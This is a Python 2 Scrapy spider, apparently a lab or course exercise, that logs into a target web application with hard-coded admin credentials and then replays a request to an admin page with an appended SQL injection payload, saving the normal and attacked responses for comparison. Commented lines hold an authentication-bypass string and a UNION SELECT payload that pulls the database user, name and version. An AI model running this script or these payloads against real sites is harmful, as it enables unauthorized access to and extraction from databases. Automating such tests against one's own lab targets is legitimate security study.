from scrapy.spider import Spider
from scrapy.selector import Selector
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from dirbot.items import Website
from scrapy.selector import HtmlXPathSelector
from scrapy.contrib.exporter import JsonItemExporter
import scrapy
from scrapy.http.request import Request
from scrapy.http import FormRequest
from scrapy import log
from loginform import fill_login_form

login_url = "https://app4.com"
username = "admin@admin.com"
password = "admin"
attack_url = "/admin/status.php"
#query_string = "username=1%27+OR+1%3D1%23&password=anything"
query_string = "op=edit&status_id=1"
payload = "'kasdgh"#"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"

class step3(Spider):
	name = "step3"
	start_urls = ["https://app4.com"]
	login_user = ["admin@admin.com"]
	login_pass = ["admin"]
	params = []
	
	def parse(self, response):
		print response
		args, url, method = fill_login_form(self.start_urls[0], response.body, self.login_user[0], self.login_pass[0])
		print args
		
		for x in query_string.split('&'):
			y = x.split('=')
			self.params.append((y[0], y[1]))
		
		return FormRequest(url, method=method, formdata=args, callback=self.after_login)
	
	def after_login(self, response):
 		if (((("ERROR: Invalid username") or ("The username/password combination you have entered is invalid"))	in response.body) or (response.url is self.start_urls[0])):
			self.log("Login failed", level=log.ERROR)
			yield
		# continue scraping with authenticated session...
		else:
			self.log("Login succeed!", level=log.DEBUG)
			print response.url
			'''f = open("app4login.html", "w")
			f.write(response.body)
			f.close()'''
			print "response end!!\n"
			
			temp = login_url + attack_url + "?" + query_string
			yield Request(url=temp, callback=self.save_original_resp)
		
		return 
	'''
	def after_login(self, response):
		print "i am here" 
		temp = login_url + attack_url
		#print temp + ": " + str(self.params)
		return FormRequest(temp, formdata=self.params, callback=self.save_original_resp)
	'''
	def save_original_resp(self, response):
		print "i am here too:" + response.url
		#print "Response: " + response.url
		file = open("original_response.html", "w")
		file.write(response.body)
		file.close()
		
		attack_with_payload = login_url + attack_url + "?" + query_string + payload
		print "With payload: " + attack_with_payload
		
		yield Request(attack_with_payload, callback=self.save_attack_resp) 
		
		return 

	def save_attack_resp(self, response):
		print "i am here finally"
		file = open("attack_response.html", "w")
		file.write(response.body)
		file.close()
		return None
	